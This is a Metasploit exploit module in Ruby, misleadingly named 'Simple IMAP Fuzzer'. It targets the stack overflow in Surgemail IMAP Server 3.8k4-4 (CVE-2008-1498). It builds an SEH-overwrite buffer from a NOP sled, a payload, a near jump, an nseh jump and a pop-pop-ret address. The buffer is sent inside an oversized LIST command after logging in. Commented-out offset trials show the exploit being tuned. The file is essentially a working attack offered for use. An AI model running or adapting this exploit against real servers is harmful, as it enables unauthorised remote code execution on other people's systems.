require 'msf/core'

#'BadChars'	=> "\x00\x09\x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b\x22"
class MetasploitModule < Msf::Exploit::Remote
	include Msf::Exploit::Remote::Imap

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Simple IMAP Fuzzer',
			'Description'   => %q{
				This module exploits a stack overflow in the Surgemail
			       	IMAP Server version 3.8k4-4 by sending an overly long
				LIST command. Valid IMAP account credentials are required.
			},
			'Author'	=> [ 'ryujin' ],
			'License'	=> MSF_LICENSE,
			'Version'	=> '$Revision: 1$',
			'References'	=> [
				[ 'BID', '28260' ],	
				[ 'CVE', '2008-1498' ],
				[ 'URL', 'http://www.exploit-db.com/exploits/5259' ],
			],
			'Privileged'     => false,
			'DefaultOptions' => 
			{
				'EXITFUNC'	=> 'thread',
			},
			'Payload'	 => 
			{
				'Space'	 	=> 10351,
				'DisableNops'	=> true,
				'BadChars'	=> "\x00\x09\x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b\x22"
			},
			'Platform'	 => 'win',
			'Targets'	 => 
			[
				# [ 'Windows Universal', { 'Ret' => 0xDEADBEFF } ],  #p/p/r TBD
				 [ 'Windows Universal', { 'Ret' => "\x7e\x51\x78" } ], # p/p/r in surgemail.exe
				#[ 'Windows Universal', { 'Ret' => "\xeb\x4d\x40", 'Offset' => 10360 } ], # p/p/r in surgemail.exe
			],
			'DisclosureDate' => 'March 13 2008',
			'DefaultTarget'  => 0
		))
	end

	#def check
	#	connect 
	#	disconnect
	#	if (banner and banner =! /(Version 3.8k4-4)/)
	#		return Exploit::CheckCode::Vulnerable
	#	end
	#	return Exploit::CheckCode::Safe
	#end

	def fuzz_str()
		return Rex::Text.rand_text_alphanumeric(rand(1024))
	end

	def exploit 
		connected = connect_login
		#lead = "\x41" * 10360
		#lead = "\x41" * 10351

		#evil = lead + "\x43" * 4
		#lead = lead + "\xe9\xdd\xd7\xff\xff"

		#evil += "\xeb\x4d\x40" 
		#evil = lead + [target.ret].pack("A3")
		
		#lead = "\x41" * 10356
		#nseh = "\xeb\xf9\x90\x90"
		#evil = lead + [target.ret].pack("A3")
		
		lead = "\x90" * (10351 - payload.encoded.length)
		print_status("\n" + (10351- payload.encoded.length).to_s + "\n")

		#near = "\xe9\xdd\xd7\xff\xff"
		#near = "\xe9\x06\xd9\xff\xff"
		#near = "\xe9\xce\xd7\xff\xff"
		near = "\xe9\xc4\xd7\xff\xff"
		#near = "\xe9\xd4\xfe\xff\xff"  #fffffed4 translate to Decimal that would be -300
		nseh = "\xeb\xf9\x90\x90"
		evil = lead + payload.encoded + near + nseh + [target.ret].pack("A3")
		#evil = lead + near + nseh + [target.ret].pack("A3")

		print_status("Sending payload")
		sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
		sock.put(sploit)
		print_status(sploit)
		print_status(evil.length.to_s)
		print_status("\n" + payload.encoded.length.to_s)
		handler
		disconnect
	end
end
